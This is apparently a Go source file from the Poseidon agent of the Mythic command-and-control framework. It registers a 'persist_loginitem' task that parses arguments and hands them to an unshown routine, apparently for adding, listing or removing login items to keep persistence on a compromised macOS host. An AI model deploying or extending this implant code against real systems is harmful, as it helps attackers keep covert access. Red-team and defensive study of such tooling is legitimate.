package persist_loginitem

import (
	// Standard
	"encoding/json"

	// Poseidon

	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/tasks/library"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils/structs"
)

func init() {
	library.RegisterTask("persist_loginitem", Run)
}

type Arguments struct {
	Path   string `json:"path"`
	Name   string `json:"name"`
	Global bool   `json:"global"`
	List   bool   `json:"list"`
	Remove bool   `json:"remove"`
}

func Run(task structs.Task) {
	msg := task.NewResponse()

	args := Arguments{}
	err := json.Unmarshal([]byte(task.Params), &args)

	if err != nil {
		msg.SetError(err.Error())
		task.Job.SendResponses <- msg
		return
	}
	r := runCommand(args.Path, args.Name, args.Global, args.List, args.Remove)
	msg.UserOutput = r.Message
	msg.Completed = true
	task.Job.SendResponses <- msg
	return
}
